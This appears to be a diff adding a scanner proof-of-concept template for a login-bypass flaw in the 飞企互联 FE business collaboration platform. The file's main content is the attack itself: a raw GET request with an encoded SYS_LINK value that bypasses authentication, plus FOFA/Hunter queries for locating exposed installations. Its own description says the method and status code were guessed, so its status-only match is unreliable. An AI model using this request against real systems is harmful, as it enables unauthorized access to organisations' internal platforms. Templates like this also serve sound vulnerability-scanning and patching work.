@@ -1,0 +1,23 @@
+id: poc-4a42f8d9c6aa3408c898
+info:
+  name: 飞企互联FE业务协作平台存在登录绕过漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4a42f8d9c6aa3408c8984a9a8fd972db
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 4a42f8d9c6aa3408c8984a9a8fd972db
+    fofa: + hunter`app.name=="飞企互联 FE 6.0+"`||`app.name=="飞企互联 FE"`
+http:
+- raw:
+  - 'GET /2.ln?SYS_LINK=77507068764957484a5067777862714f457a66574871642f4330574c76717868394a35496d37416c497951724f33446f51486375685a5a2b31684938472b7056 HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
